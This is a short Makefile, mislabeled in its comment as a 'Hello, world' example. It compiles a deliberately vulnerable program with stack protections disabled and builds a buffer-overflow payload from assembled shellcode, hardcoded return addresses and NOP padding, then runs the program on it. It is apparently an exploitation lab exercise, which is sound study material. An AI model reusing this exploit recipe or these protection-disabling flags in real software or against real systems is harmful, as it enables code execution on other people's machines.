# Makefile exaple for building "Hello, world" C program

CC = g++

ASM = nasm
ASMFLAGS = 

CFLAGS = \
-Wall \
-Wextra \
-D_FORTIFY_SOURCE=0 \
-O0 \
-g \
-fno-devirtualize \
-std=c++11 \
-fno-omit-frame-pointer \
-fno-stack-protector \
-z execstack \
-z norelro

SRC = vuln.cpp
BIN = vuln

.PHONY:all clean

all:$(BIN) payload.pwnd

$(BIN):$(SRC)
	$(CC) $(CFLAGS) -o $@ $^

payload.pwnd: pwnd.final.asm
	nasm $^ -o payload.tmp; \
	perl -e 'print "\xac\xf5\xff\xbf"' > $@; \
	perl -e 'print "\x90\x90\x90\x90"' >> $@; \
	perl -e 'print "\xb8\xf5\xff\xbf"' >> $@; \
	cat payload.tmp >> $@; \
	rm payload.tmp; \
	perl -e 'printf "\x90"x(52-49)' >> $@; \
	perl -e 'print "\xac\xf5\xff\xbf"' >> $@


runpwnd: $(BIN) payload.pwnd
	./$(BIN) "$$(cat payload.pwnd)"

clean:
	rm $(BIN)
	rm payload.pwnd

